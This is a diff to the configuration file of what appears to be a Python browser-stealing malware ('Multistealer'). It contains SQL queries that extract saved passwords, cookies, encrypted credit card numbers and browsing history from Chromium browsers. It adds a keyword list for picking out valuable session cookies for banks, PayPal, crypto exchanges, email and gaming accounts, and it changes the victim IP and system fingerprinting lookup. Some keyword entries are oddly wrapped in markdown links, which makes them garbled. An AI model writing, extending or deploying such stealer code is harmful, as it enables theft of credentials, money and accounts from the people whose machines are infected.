@@ -23,7 +23,7 @@ class ChromiumConfig:
     BookmarksRegex = compile(r'"name":\s*"([^\'\"]*)"[\s\S]*"url":\s*"([^\'\"]*)"', IGNORECASE + DOTALL)
 
     PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
-    CookiesSQL = "SELECT * FROM cookies"
+    CookiesSQL = "SELECT host_key, name, encrypted_value FROM cookies"
     CardsSQL = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
     HistorySQL = "SELECT url FROM visits ORDER BY visit_time DESC LIMIT 30000"
     HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
@@ -86,6 +86,50 @@ class ChromiumConfig:
         ]
     }
 
+    CookiesKeywords = [
+        "mail",
+        "[coinbase](https://coinbase.com)",
+        "[sellix](https://sellix.io)",
+        "[gmail](https://gmail.com)",
+        "[steam](https://steam.com)",
+        "[discord](https://discord.com)",
+        "[riotgames](https://riotgames.com)",
+        "[youtube](https://youtube.com)",
+        "[instagram](https://instagram.com)",
+        "[tiktok](https://tiktok.com)",
+        "[twitter](https://twitter.com)",
+        "[facebook](https://facebook.com)",
+        "card",
+        "[epicgames](https://epicgames.com)",
+        "[spotify](https://spotify.com)",
+        "[yahoo](https://yahoo.com)",
+        "[roblox](https://roblox.com)",
+        "[twitch](https://twitch.com)",
+        "[minecraft](https://minecraft.net)",
+        "bank",
+        "[paypal](https://paypal.com)",
+        "[origin](https://origin.com)",
+        "[amazon](https://amazon.com)",
+        "[ebay](https://ebay.com)",
+        "[aliexpress](https://aliexpress.com)",
+        "[playstation](https://playstation.com)",
+        "[hbo](https://hbo.com)",
+        "[xbox](https://xbox.com)",
+        "buy",
+        "sell",
+        "[binance](https://binance.com)",
+        "[hotmail](https://hotmail.com)",
+        "[outlook](https://outlook.com)",
+        "[crunchyroll](https://crunchyroll.com)",
+        "[telegram](https://telegram.com)",
+        "[pornhub](https://pornhub.com)",
+        "[disney](https://disney.com)",
+        "[expressvpn](https://expressvpn.com)",
+        "crypto",
+        "[uber](https://uber.com)",
+        "[netflix](https://netflix.com)"
+    ]
+
 
 class MultistealerConfig:
 
@@ -128,7 +172,7 @@ class MultistealerConfig:
 class SystemConfig:
 
     User = user
-    IPUrl = "https://api.ipify.org/"
+    IPUrl = "https://ipinfo.io/json"
     SystemData = "User: {0}\nIP: {1}\nMachine Type: {2}\nOS Name: {3}\nMachine Name on Network: {4}\nMonitor: {5}\nCPU: {6}\nGPU: {7}\nRAM:\n{8}\nDrives:\n{9}"
 
 
